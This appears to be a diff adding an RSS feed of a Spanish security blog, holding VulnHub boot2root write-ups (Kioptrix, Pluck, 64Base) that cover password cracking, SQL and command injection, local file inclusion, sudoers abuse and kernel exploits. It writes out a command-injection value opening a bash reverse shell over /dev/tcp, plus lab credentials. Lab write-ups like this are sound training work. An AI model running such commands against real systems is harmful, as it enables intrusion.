+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
+dreg		0d3eccfb887aabd50f243b3f155c0f85 : Mast3r  
+loneferret	5badcaf789d3d1d09794d8f021f40f0e : starwars
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Probamos a conectarnos con estos dos usuarios y vemos que tenemos suerte con el usuario loneferret y la contraseña starwars.&lt;/p&gt;
+
+&lt;p&gt;Una vez dentro de la máquina lo primero que hacemos es listar los ficheros del directorio, donde vemos que hay un readme.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/ssh.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mostramos el fichero del readme&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/readme.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;y este nos indica que utilicemos el comando “sudo ht” que es un editor de ficheros. Comprobamos que permisos tiene ese fichero y vemos que tiene el bit suid activado, por lo que al ejecutarse será como root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/ht_1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por lo que vamos a modificar el fichero sudoers para asignar permisos de root al usuario loneferret. Para ello lo que hacemos es añadir el binario /bin/bash para que cuando se ejecute sea con permisos de root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/ht_2.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Trás guardar los cambios, comprobamos que comandos de superusuario podemos ejecutar con el usuario loneferret y comprobamos que se ha añadido correctamente /bin/bash, por lo que ejecutamos el comando y comprobamos que efectivamente ahora somos el usuario root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/root.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 20 Apr 2017 20:11:34 +0100</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2017/04/20/Kioptrix3.0-vulnhub.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/04/20/Kioptrix3.0-vulnhub.html</guid>
+        
+        <category>boot2root</category>
+        
+        <category>kioptrix</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>Kioptrix Level 2 VulnHub Boot2Root</title>
+        <description>&lt;h1 id=&quot;kioptrix-level-2-boot2root-vulnhub&quot;&gt;Kioptrix Level 2 Boot2Root Vulnhub&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/kioptrix-level-1-1,22/&quot;&gt;https://www.vulnhub.com/entry/kioptrix-level-1-1,22/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;En primer lugar, y como en todas las máquinas que estamos realizando, lo primero en realizar siempre es un escaneo de puertos de la máquina para comprobar que servicios están corriendo en ella.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/escaneo.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que hay un apache corriendo en el puerto 80 y en el 443. Vamos a empezar mirando por ahí.
+Introduccimos la dirección IP en el navegador y lo primero que nos encontramos es una pantalla de login.&lt;/p&gt;
+
+&lt;p&gt;Probamos con la tipica usuario:contraseña de admin:admin sin éxito, por lo que vamos a lanzar la inyección sql más típica de todas  por si hubiera suerte&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/login.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y estamos de suerte, nos hemos logueado en la aplicaciṕon y ahora vemos una pantalla donde se pueden introduccir direcciones a las que se pueden realizar pings&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/admin_web.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Introducimos varias IP’s para comprobar que tipo de funcionalidad ofrece esta parte de la aplicación y enseguida caemos en la cuenta de que quizás sea vulnerable a command injection. Vamos a probar a ver si podemos listar los ficheros que se encuentran en el actual directorio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/command_execution.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y Voilá! Estabamos en lo cierto, es vulnerable a Command Injection!!!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/result_command_execution.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para que nos sea más cómodo trabajar con la máquina, vamos a conectarnos a ella con una reverse shell.En este caso probé a realizarlo mediante netcat como he hecho en otras máquinas pero no me dió buenos resultados, por lo que vamos a pentestmonkey para buscar una reverse shell en bash, la cuál podemos encontrar aquí &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos ponemos con netcat a escuchar en nuestra máquina conexiones entrantes&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvp 8080&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y modificamos la línea de comando cambiando la ip y el puerto por los nuestros, de manera que el siguiente comando es el que tenemos que introduccir en la casilla de ping:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;localhost; bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.37/8080 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/reverse_shell.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como se puede ver en la imagen anterior, se ha realizado la conexión y lo primero que hemos hecho es comprobar que usuario somos, en este caso apache.
+Lo siguiente que hemos realizado es que versión de kernel tiene la máquina para buscar si existe algún exploit público.
+El kernel de la máquina es Linux 2.6.9-55.
+Por lo que buscamos un exploit que sea para ese kernel y esa versión el cuál podemos encontrar aquí: &lt;a href=&quot;https://www.exploit-db.com/exploits/9542/&quot;&gt;https://www.exploit-db.com/exploits/9542/&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Lo descargamos, compilamos y ejecutamos y conseguimos root en la máquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_2/root.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 01 Apr 2017 20:11:34 +0100</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2017/04/01/Kioptrix2.0-vulnhub.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/04/01/Kioptrix2.0-vulnhub.html</guid>
+        
+        <category>boot2root</category>
+        
+        <category>kioptrix</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>Kioptrix Level 1 VulnHub Boot2Root</title>
+        <description>&lt;h1 id=&quot;kioptrix-level-1-boot2root-vulnhub&quot;&gt;Kioptrix Level 1 Boot2Root Vulnhub&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/kioptrix-level-1-1,22/&quot;&gt;https://www.vulnhub.com/entry/kioptrix-level-1-1,22/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;Como bien se indica en la descripción de la máquina hay varias posibilidades de conseguir root en la máquina. Yo he descubierto dos de ellas, pero ignoro si existe alguna otra forma. He decidio dividir las soluciones para que esté la información lo más organizada posible.&lt;/p&gt;
+
+&lt;h2 id=&quot;solución-1&quot;&gt;Solución 1&lt;/h2&gt;
+
+&lt;p&gt;Lo primero,como hacemos siempre, es realizar un escaneo de puertos de la máquina para ver que servicios están corriendo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_1/escaneo.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Empezamos por mirar el puerto 80 accediendo a la IP de la máquina a través del navegador.En este caso y a diferencia de otras máquinas no hay nada interesante, por lo que debemos de tirar por otro lado.&lt;/p&gt;
+
+&lt;p&gt;En el escaneo de puertos, hemos puesto el flag que muestra la versión de cada servicio que está corriendo, por lo que directamente nos arroja que en el puerto 80 y 443 hay un apache con versión 1.3.20. con mod_ssl 2.8.4.&lt;/p&gt;
+
+&lt;p&gt;Buscamos si existe algún exploit público para esa versión de mod_ssl y efectivamente encontramos uno en exploitdb: &lt;a href=&quot;https://www.exploit-db.com/exploits/764/&quot;&gt;https://www.exploit-db.com/exploits/764/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;El exploit es algo antiguo, por lo que tal y como indican en un comentario al principio del mismo, hay que hacer unos pequeños cambios que se detallan en la siguiente url: &lt;a href=&quot;http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/&quot;&gt;http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Una vez hecho esos cambios, compilamos tal y como indican en el artículo. Ya solo queda ejecutar el mismo y obtener usuario root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_1/apache_exploit.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;solución-2&quot;&gt;Solución 2&lt;/h2&gt;
+
+&lt;p&gt;Está solución es incluso más rápido y sencilla.&lt;/p&gt;
+
+&lt;p&gt;En el escaneo de puertos hemos visto que existe un servicio de samba corriendo, por lo que vamos a mirar si somos capaces de obtener la versión de samba.Para ello utilizamos el comando smbclient.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -L 192.168.1.36&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y obtenemos la version de samba 2.2.1.a tal y como muestra la imagen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_1/smbclient.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez que sabemos la versión, buscamos por si hubiera algún exploit público para esa versión de Samba.
+Tenemos suerte y encontramos uno aquí: &lt;a href=&quot;https://www.exploit-db.com/exploits/10/&quot;&gt;https://www.exploit-db.com/exploits/10/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo descargamos, compilamos y ejecutamos consiguiendo usuario root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_1/samba_root.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 01 Apr 2017 20:11:34 +0100</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2017/04/01/Kioptrix1.0-vulnhub.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/04/01/Kioptrix1.0-vulnhub.html</guid>
+        
+        <category>boot2root</category>
+        
+        <category>kioptrix</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>Pluck VulnHub Boot2Root</title>
+        <description>&lt;h1 id=&quot;pluck-boot2root-vulnhub&quot;&gt;Pluck Boot2Root Vulnhub&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/pluck-1,178/&quot;&gt;https://www.vulnhub.com/entry/pluck-1,178/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; “Enjoy” — @ryanoberto&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;Lo primero que hacemos siempre, es realizar un escaneo de puertos de la máquina para ver que servicios están corriendo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/pluck/escaneo.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que tiene abiertos los puertos 80, 22, 3306 y el 5355.&lt;/p&gt;
+
+&lt;p&gt;Empezamos por mirar el puerto 80 accediendo a la IP de la máquina a través del navegador.&lt;/p&gt;
+
+&lt;p&gt;Hacemos una vuelta de reconocimiento por la página para ver que funcionalidades presenta, buscamos el fichero robots.txt, etc.
+Vemos que el fichero robots.txt no existe.Pasamos a analizar las funcionalidades de la página y comprobamos que existe un apartado para dejar comentarios y un login.Lo primero que probamos es meter la típica comilla y vemos que nos arroja un error de SQL.
+&lt;img src=&quot;/images/Vulnhub/pluck/SQLI.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Parece que hay un SQLinjection, por lo que probamos a intentar explotarlo pero sin éxito. Más tarde volveremos a este punto.
+También vemos que en la página de index.php hay un parámetro page donde se referencian archivos.
+Es la tipología clásica del local file inclusión, por lo que probamos a ver si podemos ver el fichero  /etc/passwd y efectivamente existe la vulnerabilidad.
+&lt;img src=&quot;/images/Vulnhub/pluck/LFI.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al final del fichero de /etc/passwd , se puede observar como se crea un backup de la máquina mediante un script en bash.
+Accedemos también a él para comprobar que es lo que hace el script.
+&lt;img src=&quot;/images/Vulnhub/pluck/backup_sh.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos indica que se realiza un backup y la ruta donde se almacena por lo que vamos a bajarnos el backup a ver que encontramos en él.
+&lt;img src=&quot;/images/Vulnhub/pluck/download_backup.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez descargado el backup, para poder descomprimirlo hay que eliminar la parte de HTML que hay tanto por el principio como por el final, porque sino no seremos capaces de descomprimirlo,ya que nos dará errores.&lt;/p&gt;
+
+&lt;p&gt;Dentro de la carpeta de home se puede observar que hay 3 usuarios, y en uno de ellos hay una carpeta keys con varias claves.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/pluck/directory_listing.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Anteriormente, mediante el escaneo de puertos hemos visto que se encontraba el puerto del ssh abierto, por lo que intentamos loguearnos con la claves en ese servicio viendo que tenemos suerte con la clave id_key4&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i id_key4 paul@192.168.1.115&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez conectados por ssh a la máquina nos aparece una especie de menu, con el que podemos interactuar con la máquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/pluck/menu.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Trás estar probando las diferentes opciones, vemos que en varias funciones se realizan ejecución de comando en la máquina ya sea un cd para cambiar de directorio, un ls para listarlo o el uso del editor vim para editar un fichero.
+Vamos a comprobar el contenido del fichero login.php para comprobar que tipo de petición se realiza y comprobar porque no hemos podido explotar el sqlinjection antior.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/pluck/fake_sqli.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No lo habíamos podido explotar ya que se trataba de un fake, por lo que nos dedicamos a jugar un poco con el menu que nos proporciona la sesión ssh.
+Trás un rato jugando con las opciones que proporciona el menu de la sesión ssh, intentamos ejecutar comandos en la consola concatenandolos con el uso de ;.
+Vemos que en la opción de editar fichero, podemos ejecutar comandos por lo que ejecutamos un shell para salir del menu y poder trabajar más comodamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/pluck/getting_shell.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez que tenemos la shell, buscamos para ver si hay algún fichero con el bit suid activo que nos pudiera ser útil.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/pluck/find_suid.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No encontramos nada fuera de lo normal, por lo que vamos a ver si hubiera algua vulnerabilidad pública para el kernel de la máquina&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/pluck/uname.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos suerte y la versión del kernel de la máquina es vulnerable a DirtyCow, por lo que descargamos el exploit en la máquina, lo compilamos tal y como indican y lo ejecutamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/pluck/cow.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que hemos comprobado que efectivamente somos root ya solo queda mostrar el contenido del fichero flag.txt.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/pluck/flag.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 28 Mar 2017 20:11:34 +0100</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2017/03/28/Pluck-vulnhub.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/03/28/Pluck-vulnhub.html</guid>
+        
+        <category>boot2root</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>64Base VulnHub Boot2Root</title>
+        <description>&lt;h1 id=&quot;64base-boot2root-vulnhub&quot;&gt;64Base Boot2Root Vulnhub&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/64base-101,173/&quot;&gt;https://www.vulnhub.com/entry/64base-101,173/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; There are 6 flags to collect. Each in the format of flag1{ZXhhbXBsZSBmbGFnCg==} Beat the Empire and steal the plans for the Death Star before its too late.&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;En primer lugar quiero indicar que he resuelto la máquina desde dos redes diferentes por lo que a veces aparecerá la IP 192.168.1.40 y otras veces la IP 192.168.0.171.&lt;/p&gt;
+
+&lt;p&gt;Lo primero que hacemos siempre, es realizar un escaneo de puertos de la máquina para ver que servicios están corriendo&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/escaneo.png&quot; alt=&quot;Nmap&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que tiene abiertos los puertos 80, 22, 4899 y el 62964.
+Parece ser que el servicio ssh está corriendo en el puerto 62964 en lugar de el puerto por defecto(22).
+Miramos a ver que hay en el puerto 22 y 4899 conectandonos con el comando netcat y observamos que no arroja información relevante, parecen ser servicios levantados para distraer.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/fake_22.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;
+&lt;img src=&quot;/images/Vulnhub/64base/fake_4899.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Empezamos por mirar el puerto 80 accediendo a la IP de la máquina a través del navegador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag1_1.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos encontramos que lo primero que vemos es un mensaje en base64 de bajo del título de la máquina “dmlldyBzb3VyY2UgO0QK” que nos indica “view source ;D”&lt;/p&gt;
+
+&lt;p&gt;Abrimos la consola de desarrollador y nos ponemos a mirar el source de la página para ver que nos encontramos.
+Vemos una cadena de texto en hexadecimal.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/64base/flag1_2.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Al pasar el hexadecimal a ASCCI nos devuelve una cadena en base64&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y al decodear la cadena nos aparece la primera flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;EL contenido de la flag es un base64 también.Lo decodeamos y nos dá lo que parece ser un usuario y una contraseña.&lt;/p&gt;
+
+&lt;p&gt;64base:Th353@r3N0TdaDr01DzU@reL00K1ing4&lt;/p&gt;
+
+&lt;p&gt;Una vez que tenemos el usuario y la contraseña intentamos entrar por ssh con ellos en el puerto 62964 pero sin éxito.
+Por lo que volvemos a centrarnos en el puerto 80.&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente que hacemos es comprobar si existe el fichero robots.txt  y en ese caso ver si contiene algún contenido interesante:&lt;/p&gt;
+
+&lt;p class=&quot;code&quot;&gt;User-agent: *&lt;br /&gt;
+Disallow: /administrator/&lt;br /&gt;
+Disallow: /admin/&lt;br /&gt;
+Disallow: /login/&lt;br /&gt;
+Disallow: /88888/&lt;br /&gt;
+Disallow: /88888888/&lt;br /&gt;
+Disallow: /88888888888/&lt;br /&gt;
+Disallow: /88888888888P/&lt;br /&gt;
+Disallow: /c3P08P/&lt;br /&gt;
+Disallow: /C3p0/&lt;br /&gt;
+Disallow: /A280/&lt;br /&gt;
+Disallow: /above/&lt;br /&gt;
+Disallow: /AC1/&lt;br /&gt;
+Disallow: /across/&lt;br /&gt;
+Disallow: /activation/&lt;br /&gt;
+Disallow: /Adjustments/&lt;br /&gt;
+Disallow: /after/&lt;br /&gt;
+Disallow: /against/&lt;br /&gt;
+Disallow: /ago/&lt;br /&gt;
+Disallow: /air/&lt;br /&gt;
+Disallow: /Air/&lt;br /&gt;
+Disallow: /aliens/&lt;br /&gt;
+Disallow: /All/&lt;br /&gt;
+Disallow: /allies/&lt;br /&gt;
+Disallow: /and/&lt;br /&gt;
+Disallow: /Arcade/&lt;br /&gt;
+Disallow: /are/&lt;br /&gt;
+Disallow: /Area/&lt;br /&gt;
+Disallow: /Armament/&lt;br /&gt;
+Disallow: /armies/&lt;br /&gt;
+Disallow: /armour/&lt;br /&gt;
+Disallow: /arsenal/&lt;br /&gt;
+Disallow: /Art/&lt;br /&gt;
+Disallow: /as/&lt;br /&gt;
+Disallow: /Ascii/&lt;br /&gt;
+Disallow: /Assassin/&lt;br /&gt;
+Disallow: /assault/&lt;br /&gt;
+Disallow: /Assault/&lt;br /&gt;
+Disallow: /assaults/&lt;br /&gt;
+Disallow: /Astromech/&lt;br /&gt;
+Disallow: /AT-AT/&lt;br /&gt;
+Disallow: /AT-ST/&lt;br /&gt;
+Disallow: /attacks/&lt;br /&gt;
+Disallow: /Aural/&lt;br /&gt;
+Disallow: /away/&lt;br /&gt;
+Disallow: /awesome/&lt;br /&gt;
+Disallow: /b/&lt;br /&gt;
+Disallow: /B/&lt;br /&gt;
+Disallow: /back-/&lt;br /&gt;
+Disallow: /Barracks/&lt;br /&gt;
+Disallow: /base/&lt;br /&gt;
+Disallow: /Base/&lt;br /&gt;
+Disallow: /Bases/&lt;br /&gt;
+Disallow: /Battle/&lt;br /&gt;
+Disallow: /Bay/&lt;br /&gt;
+Disallow: /Bays/&lt;br /&gt;
+Disallow: /Beam/&lt;br /&gt;
+Disallow: /become/&lt;br /&gt;
+Disallow: /been/&lt;br /&gt;
+Disallow: /beneath/&lt;br /&gt;
+Disallow: /Bike/&lt;br /&gt;
+Disallow: /BioTronics/&lt;br /&gt;
+Disallow: /Bipedal/&lt;br /&gt;
+Disallow: /bizarre/&lt;br /&gt;
+Disallow: /Blast/&lt;br /&gt;
+Disallow: /BlasTech/&lt;br /&gt;
+Disallow: /Blaster/&lt;br /&gt;
+Disallow: /Block/&lt;br /&gt;
+Disallow: /bomber/&lt;br /&gt;
+Disallow: /Bomber/&lt;br /&gt;
+Disallow: /bombers/&lt;br /&gt;
+Disallow: /bone/&lt;br /&gt;
+Disallow: /Bounty/&lt;br /&gt;
+Disallow: /Brain/&lt;br /&gt;
+Disallow: /burns/&lt;br /&gt;
+Disallow: /by/&lt;br /&gt;
+Disallow: /C/&lt;br /&gt;
+Disallow: /ca-/&lt;br /&gt;
+Disallow: /ceiling/&lt;br /&gt;
+Disallow: /chasing/&lt;br /&gt;
+Disallow: /Chutes/&lt;br /&gt;
+Disallow: /civil/&lt;br /&gt;
+Disallow: /Class/&lt;br /&gt;
+Disallow: /Collection/&lt;br /&gt;
+Disallow: /command/&lt;br /&gt;
+Disallow: /Commander/&lt;br /&gt;
+Disallow: /Computer/&lt;br /&gt;
+Disallow: /conflict/&lt;br /&gt;
+Disallow: /Connecting/&lt;br /&gt;
+Disallow: /control/&lt;br /&gt;
+Disallow: /Control/&lt;br /&gt;
+Disallow: /Controls/&lt;br /&gt;
+Disallow: /Cooling/&lt;br /&gt;
+Disallow: /courage/&lt;br /&gt;
+Disallow: /Cybot/&lt;br /&gt;
+Disallow: /d/&lt;br /&gt;
+Disallow: /D/&lt;br /&gt;
+Disallow: /d88b/&lt;br /&gt;
+Disallow: /d88P/&lt;br /&gt;
+Disallow: /d8b/&lt;br /&gt;
+Disallow: /d8P/&lt;br /&gt;
+Disallow: /dark/&lt;br /&gt;
+Disallow: /DeathStar/&lt;br /&gt;
+Disallow: /Deck/&lt;br /&gt;
+Disallow: /deflector/&lt;br /&gt;
+Disallow: /Destroyer/&lt;br /&gt;
+Disallow: /destruction/&lt;br /&gt;
+Disallow: /Detention/&lt;br /&gt;
+Disallow: /devices/&lt;br /&gt;
+Disallow: /diplomatic/&lt;br /&gt;
+Disallow: /Diplomatic/&lt;br /&gt;
+Disallow: /Dismantle/&lt;br /&gt;
+Disallow: /DL-18/&lt;br /&gt;
+Disallow: /DL-44/&lt;br /&gt;
+Disallow: /Docking/&lt;br /&gt;
+Disallow: /Doors/&lt;br /&gt;
+Disallow: /Drive/&lt;br /&gt;
+Disallow: /Droid/&lt;br /&gt;
+Disallow: /Droids/&lt;br /&gt;
+Disallow: /e/&lt;br /&gt;
+Disallow: /E/&lt;br /&gt;
+Disallow: /efficient/&lt;br /&gt;
+Disallow: /Empire/&lt;br /&gt;
+Disallow: /equipped/&lt;br /&gt;
+Disallow: /escaped/&lt;br /&gt;
+Disallow: /every/&lt;br /&gt;
+Disallow: /evil/&lt;br /&gt;
+Disallow: /extremely/&lt;br /&gt;
+Disallow: /f/&lt;br /&gt;
+Disallow: /famous/&lt;br /&gt;
+Disallow: /fantastic/&lt;br /&gt;
+Disallow: /far/&lt;br /&gt;
+Disallow: /faster/&lt;br /&gt;
+Disallow: /fear/&lt;br /&gt;
+Disallow: /Fear/&lt;br /&gt;
